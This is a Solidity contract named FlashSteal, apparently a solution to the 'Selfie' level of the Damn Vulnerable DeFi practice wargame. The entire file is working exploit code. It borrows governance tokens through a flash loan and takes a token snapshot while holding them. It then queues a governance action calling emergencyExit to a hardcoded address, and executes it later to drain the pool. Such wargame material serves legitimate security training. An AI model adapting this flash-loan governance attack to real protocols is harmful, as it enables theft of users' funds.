// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SimpleGovernance.sol";
import "./SelfiePool.sol";
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";


contract FlashSteal is IERC3156FlashBorrower{

    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;
    SelfiePool public pool;
    address public owner;
    uint actionId;
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    bytes public _data = abi.encodeWithSignature("emergencyExit(address)" , 0x70997970C51812dc3A010C7d01b50e0d17dc79C8);
    constructor(address _governance, address _token, address _pool) {
        governance = SimpleGovernance(_governance);
        token = DamnValuableTokenSnapshot(_token);
        pool = SelfiePool(_pool);
        owner = msg.sender;
    }

    function flash(uint amount) external {
        pool.flashLoan(IERC3156FlashBorrower(address(this)),address(token),amount, _data);
    }


     function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata data
    ) external returns (bytes32) {
        token.snapshot();
        actionId = governance.queueAction(address(pool), 0, data);
        token.approve(address(pool),amount);
        return CALLBACK_SUCCESS;
    }

    function executeId() external {
        governance.executeAction(actionId);
    }


}